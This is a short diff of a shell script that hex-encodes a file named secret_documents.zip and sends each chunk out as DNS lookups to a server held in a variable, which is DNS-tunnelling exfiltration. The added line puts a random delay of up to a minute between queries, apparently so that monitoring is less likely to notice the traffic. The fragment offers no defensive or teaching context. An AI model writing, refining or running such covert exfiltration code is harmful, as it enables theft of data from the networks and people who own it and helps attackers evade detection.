@@ -11,5 +11,6 @@ xxd -p secret_documents.zip >  secret_documents.hex
 for line in $(cat secret_documents.hex)
 do
 dig $line.${SERVER}
+sleep $[ ( $RANDOM % 60 )  + 1 ]s
 done
 #
